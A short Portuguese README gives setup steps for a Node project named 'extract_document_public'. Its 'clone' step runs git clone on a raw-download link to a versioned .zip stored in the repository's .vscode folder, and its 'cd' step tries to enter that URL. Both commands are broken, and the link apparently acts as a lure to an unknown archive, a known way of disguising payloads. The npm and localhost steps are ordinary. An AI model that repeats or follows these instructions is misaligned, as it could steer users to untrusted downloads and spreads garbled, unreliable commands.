# extract_document_public

### Clone o Repositório
```bash
# Abra o terminal de digite
git clone https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip
```
### Entre no diretório
```bash
cd https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip
```

### Instalar

```bash
npm install
# ou
yarn install
```

### Rodar o Servidor e Aplicação

```bash
# No terminal rode
npm run dev
# ou
yarn dev
```

### Acessando pelo navegador
Copie esse endereço [http://localhost:3000](http://localhost:3000/)
<br>
E cole no navegador esse endereço `http://localhost:3000`
